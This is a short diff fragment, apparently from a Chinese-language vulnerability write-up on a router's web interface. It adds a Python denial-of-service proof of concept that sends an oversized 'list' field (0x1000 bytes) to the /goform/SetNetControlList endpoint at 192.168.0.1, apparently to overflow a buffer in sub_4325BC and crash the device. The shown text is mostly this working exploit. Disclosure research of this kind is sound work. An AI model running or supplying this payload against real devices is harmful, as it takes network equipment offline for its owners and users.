@@ -24,3 +24,13 @@ v2来自于http数据包中的list变量，随后调用了`sub_4325BC`函数
 
 拒绝服务的Poc：
 
+```python
+import requests
+
+url = "http://192.168.0.1/goform/SetNetControlList"
+list_data = 'a'*0x1000 + '\n'
+
+r = requests.post(url, data={'list': list_data})
+print(r.content)
+```
+
